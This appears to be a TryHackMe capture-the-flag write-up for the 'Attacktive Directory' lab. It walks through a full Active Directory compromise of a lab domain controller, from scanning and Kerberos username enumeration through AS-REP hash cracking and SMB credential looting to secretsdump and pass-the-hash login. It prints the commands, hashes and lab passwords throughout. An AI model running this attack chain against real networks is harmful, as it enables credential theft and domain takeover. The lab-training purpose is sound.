# Recon
```
sudo nmap -sV -sC -O -p- -oN nmap.txt -Pn 10.10.186.109
```
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/main/AttacktiveDirectory/assets/1.png">

A lot of open ports and the target appears to be a domain controller. This will most likely give us a lot of enumeration abilities.
<br>
# Enumeration
We spot the domain controller: spookysec.local
Let's add it to the /etc/hosts file and run kerbrute to enumerate usernames.

> Kerbrute is a tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication. https://github.com/ropnop/kerbrute
```
./kerbrute userenum --dc spookysec.local -d spookysec.local ~/tmp/users.txt
```
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/AttacktiveDirectory/assets/2.png">

We notice backup, administrator and svc-admin as interesting accounts.
<br>
# Initial foothold
We'll try to get hashes with GetNPUsers.py from Impacket.
```
GetNPUsers.py spookysec.local/svc-admin -request -no-pass -dc-ip 10.10.186.109
```
```
[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:d31db66d309676ff0e7c5ecd880e698c$ea9ff1c3cb9619410aad19503c0c4381008eff11d3ea6c09ab916b44b1eb43814c2f09eb0844c934391e8e033c565dff359fa2e0530aadffcbb4f433fe87e1f20be9fce5d7ea01b2d7ca7390d38214cb2e0d0ab56b6e0a5f7a5c73d45aeaf475b00ca34245478c9deec60050ace07d31b1899c134e755ed46dbc7201de4de174bfbd1fdaf6d8a67789f10e4af8a88652f07a94d180f1ddac56e8e419e437b7e18552bd59fec397ec41ff4376ff97b18ead4d54b9c32398b8a5a6595cb949035a41fbbb8fe68da5ca9c6d937af1fc06e63fef1d3372a57a4c9289244a79cfe10bd76af6191d11ba87fd3dc145117ff8220aaa
```

We got a Keberos 5. AS-REP hash. Let's try to crack it with hashcat:
```
hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

We got a pass:
```
spookysec.local/svc-admin:management2005
```

Let's list the shares with this account:
```
smbclient -L //10.10.186.109/ -U spookysec.local/svc-admin
```                                                  
Enter SPOOKYSEC.LOCAL\svc-admin's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 


Let's connect to the backup share and download all files:
```
smbclient //10.10.186.109/backup/ -U spookysec.local/svc-admin 
Enter SPOOKYSEC.LOCAL\svc-admin's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020

                8247551 blocks of size 4096. 3601776 blocks available
smb: \> mget *
```

We got a base64 encoded string. After decoding it says:
```
backup@spookysec.local:backup2517860
```

Let's use this account to dump NTLM hashes with secretsdump.
```
secretsdump.py -dc-ip 10.10.186.109 spookysec.local/backup:backup2517860@10.10.186.109
```

We got a administrator hash:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
```

Let's use it to connect with evil-winrm:
```
evil-winrm  -i 10.10.186.109 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc 
```
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/AttacktiveDirectory/assets/3.png">










